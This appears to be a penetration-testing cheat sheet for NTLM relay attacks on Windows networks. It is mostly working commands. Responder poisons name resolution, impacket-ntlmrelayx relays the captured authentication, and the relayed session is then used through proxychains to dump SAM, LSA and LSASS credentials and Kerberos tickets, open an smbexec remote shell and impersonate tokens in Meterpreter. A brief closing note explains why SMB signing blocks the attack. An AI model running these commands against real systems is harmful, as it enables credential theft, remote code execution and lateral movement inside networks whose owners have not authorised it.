NTLM Relay Attack - Cheat Sheet

Instead of cracking a captured NTLM hash, relay it in real time to authenticate
against another machine as the victim user - no password or cracking needed.
Replace the placeholders (<...>) with your own values.


Step 1 - Check if SMB signing is disabled on targets

SMB signing must be disabled on the target for the relay to succeed.
Check the network:

    nxc smb <target-subnet>/<cidr>

Look for:  signing:False  in the output.
Machines with signing:True cannot be relayed via SMB.


Step 2 - Configure Responder to NOT handle SMB/HTTP

ntlmrelayx needs to own ports 445 (SMB) and 80 (HTTP).
Edit Responder's config and turn those two listeners off:

    sudo nano /usr/share/responder/Responder.conf

Set:
    SMB = Off
    HTTP = Off

Responder will still poison LLMNR/NBT-NS - it just won't answer the auth itself.


Step 3 - Start Responder (poisoning only)

    sudo responder -I <interface>

Responder now poisons name resolution and redirects victims to Kali,
but ntlmrelayx (not Responder) will handle the incoming authentication.


Step 4 - Start ntlmrelayx

In a new terminal, start the relay listener.

Basic relay - dump SAM hashes from the target automatically:

    impacket-ntlmrelayx -t <target-ip> -smb2support

Relay + open a SOCKS proxy (lets you run other tools through the session):

    impacket-ntlmrelayx -t <target-ip> -smb2support -socks

Relay + save captured hashes to a file:

    impacket-ntlmrelayx -t <target-ip> -smb2support -of netntlm.hash -socks

    Flags:
      -t            target to relay auth to
      -smb2support  enable SMBv2 (required for modern Windows)
      -socks        open a SOCKS proxy so other tools ride the session
      -of           save NetNTLM hashes to a file

When a victim triggers an LLMNR query, ntlmrelayx catches their auth and
relays it to the target. With -socks, you now have an authenticated SOCKS
session you can tunnel tools through - without ever knowing the password.


Step 5 - Configure proxychains

Proxychains routes tools through ntlmrelayx's SOCKS proxy.
Edit the config:

    sudo nano /etc/proxychains4.conf

Add at the bottom (ntlmrelayx uses port 1080 by default):

    socks4  127.0.0.1  1080

Use proxychains4 in strict mode (comment out dynamic_chain, use strict_chain).


Step 6 - Post-exploitation through the relay session

All commands below authenticate as the relayed user - no password required.

-- Dump LSA secrets and hashes (secretsdump) --

    proxychains impacket-secretsdump --no-pass '<domain>/<username>'@'<target-ip>'

Dumps: SAM hashes, LSA secrets, DPAPI keys, cached credentials.

-- Dump LSASS and Kerberos tickets (lsassy) --

    proxychains lsassy --no-pass -d <domain> -u <username> <target-ip>

Dumps: NT hashes, plaintext passwords (if cached), Kerberos TGTs.
Tickets are written to /root/.config/lsassy/tickets/ and can be used
for Pass-the-Ticket attacks.

-- Get a remote shell (smbexec) --

    proxychains impacket-smbexec --no-pass '<domain>/<username>'@'<target-ip>'

Gives a semi-interactive shell as the relayed user.
No binary is dropped on disk (unlike psexec).


Step 7 - Token impersonation (Meterpreter)

If you get a Meterpreter session (e.g. via smbexec + payload), you can
impersonate other users whose tokens are available on the target.

Load the incognito extension:

    meterpreter > use incognito

List available tokens:

    meterpreter > list_tokens -u

    Delegation Tokens   - can be used for impersonation (full auth)
    Impersonation Tokens - limited, only for local actions

Impersonate a user (quote the token if the domain\user format causes issues):

    meterpreter > impersonate_token 'DOMAIN\username'

Verify you switched context:

    meterpreter > getuid

Drop impersonation and return to original token:

    meterpreter > rev2self


(note) LDAP relay

ntlmrelayx can also relay to LDAP instead of SMB:

    impacket-ntlmrelayx -t ldap://<dc-ip> -smb2support

Useful for ACL abuse and delegation attacks - covered separately.


Key idea: NTLM relay does not crack the hash - it forwards the authentication
handshake to a target in real time. The target sees a valid login from the victim.
This is why SMB signing exists: signed packets cannot be relayed because the
attacker cannot forge the signature without knowing the session key.
